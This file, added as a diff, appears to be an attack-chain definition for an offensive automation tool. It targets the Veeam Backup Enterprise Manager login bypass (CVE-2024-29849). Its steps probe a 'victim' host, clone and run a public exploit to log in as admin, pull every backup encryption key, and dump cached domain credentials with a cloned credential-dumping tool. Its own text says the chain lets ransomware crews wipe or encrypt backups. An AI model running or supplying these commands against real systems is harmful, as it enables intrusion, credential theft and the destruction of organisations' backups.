@@ -1,0 +1,58 @@
+chain_id: veeam_cve_2024_29849
+title: "Veeam Backup Enterprise Manager — CVE-2024-29849 unauth login bypass"
+severity: CRITICAL
+tags: [web, veeam, backup, cve-2024-29849, auth-bypass, ransomware]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-29849" }
+    - { banner_pattern: "(?i)veeam|enterprise\\s*manager" }
+    - { product_pattern: "(?i)veeam" }
+    - { path_pattern: "(?i)/api/oauth2/token|/EnterpriseManager" }
+
+description: |
+  Veeam Backup Enterprise Manager 5.0–12.1.2.171: the SSO login flow
+  trusts an attacker-supplied JWT signed with a known/leaked key,
+  letting any unauth user log in as any admin. Veeam servers store the
+  encryption keys for every backup repository — once you're in,
+  ransomware crews can wipe / encrypt every backup. Patched in
+  12.1.2.172, but the install base is huge.
+
+steps:
+  - id: 1
+    title: "Confirm Enterprise Manager is exposed"
+    command: |
+      curl -sk -i "https://$VICTIMA:9443/" | grep -i 'veeam\\|enterprise'
+      curl -sk "https://$VICTIMA:9443/api/oauth2/token" -I
+
+  - id: 2
+    title: "Run the public PoC"
+    command: |
+      git clone https://github.com/sinsinology/CVE-2024-29849 /tmp/veeam
+      python3 /tmp/veeam/exploit.py -t https://$VICTIMA:9443 -u admin
+
+  - id: 3
+    title: "Once logged in: download every backup encryption key"
+    command: |
+      # The session cookie from step 2 unlocks /api/encryptionKeys
+      curl -sk -b 'session=<...>' \
+        "https://$VICTIMA:9443/api/encryptionKeys" | jq
+
+  - id: 4
+    title: "Pivot — Veeam servers always have domain creds cached"
+    command: |
+      # On the Veeam host (after RCE via Veeam One or Backup):
+      reg query "HKLM\\Software\\Veeam\\Veeam Backup and Replication\\CDPProxy"
+      # Decrypt with VeeamHashDumper or Veeamp:
+      git clone https://github.com/sadshade/veeam-creds /tmp/veeamcreds
+      python3 /tmp/veeamcreds/veeam-creds.py
+
+common_errors:
+  - error: "/api/oauth2/token returns 404"
+    solution: |
+      Patched (≥ 12.1.2.172) or Enterprise Manager moved to a non-default
+      port. Check 9405 / 9419 — Veeam Backup Service ports use those.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-29849
+  - https://www.veeam.com/kb4581
